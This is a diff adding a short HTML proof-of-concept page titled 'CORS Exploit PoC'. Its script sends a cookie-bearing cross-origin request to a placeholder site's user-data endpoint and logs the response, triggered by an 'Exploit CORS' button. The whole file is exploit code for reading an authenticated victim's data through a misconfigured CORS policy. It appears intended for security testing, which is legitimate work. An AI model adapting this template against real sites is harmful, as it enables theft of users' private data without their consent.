@@ -1,0 +1,21 @@
+<!DOCTYPE html>
+<html>
+   <head>
+      <title>CORS Exploit PoC</title>
+      <script>
+         function corsExploit() {
+            var xhr = new XMLHttpRequest();
+            xhr.open('GET', 'https://vulnerable-website.com/api/getUserData', true);
+            xhr.onload = function() {
+               // Access the response data from the vulnerable website
+               console.log(xhr.responseText);
+            }
+            xhr.withCredentials = true; // This enables sending cookies
+            xhr.send();
+         }
+      </script>
+   </head>
+   <body>
+      <button onclick="corsExploit()">Exploit CORS</button>
+   </body>
+</html>
